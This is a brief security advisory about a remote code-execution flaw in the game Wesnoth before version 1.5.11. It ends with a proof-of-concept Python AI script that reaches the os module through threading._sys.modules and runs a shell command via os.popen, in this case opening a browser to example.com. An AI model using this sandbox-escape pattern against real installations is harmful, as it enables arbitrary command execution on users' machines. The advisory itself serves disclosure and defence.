source: http://www.securityfocus.com/bid/33971/info

Wesnoth is prone to a remote code-execution vulnerability caused by a design error.

Attackers can exploit this issue to execute arbitrary Python code in the context of the user running the vulnerable application.

Versions prior to Wesnoth 1.5.11 are affected.

#!WPY
import threading
os = threading._sys.modules['os']
f = os.popen("firefox 'http://www.example.com'")
f.close()